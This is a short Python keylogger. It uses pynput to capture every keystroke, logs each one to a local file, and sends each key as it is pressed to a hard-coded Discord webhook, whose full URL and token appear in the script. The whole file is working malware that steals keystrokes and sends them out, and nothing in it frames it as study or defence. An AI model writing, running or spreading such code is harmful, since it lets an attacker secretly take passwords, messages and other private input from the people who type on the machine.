from pynput.keyboard import Key, Listener
from dhooks import Webhook
import logging
import threading

log_dir = ""

# Replace 'WEBHOOK_URL' with your actual Discord webhook URL
WEBHOOK_URL = 'https://discord.com/api/webhooks/1186985510242107413/WBRGMxPdJshFgeiB_J7gOOSQAIaUzghY56qA423ztlf1vulXCsj1-16kzWCbC2JsEVJs'

log_send = Webhook(WEBHOOK_URL)

logging.basicConfig(filename=(log_dir + "keylogs.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))
    print(key)
    log_send.send(str(key))

# Start the listener in a separate thread with daemon=True
listener_thread = threading.Thread(target=Listener(on_press=on_press).join, daemon=True)
listener_thread.start()

# Keep the main thread running
try:
    # The main thread can perform other tasks or simply sleep
    while True:
        pass
except KeyboardInterrupt:
    print("Script terminated by user.")
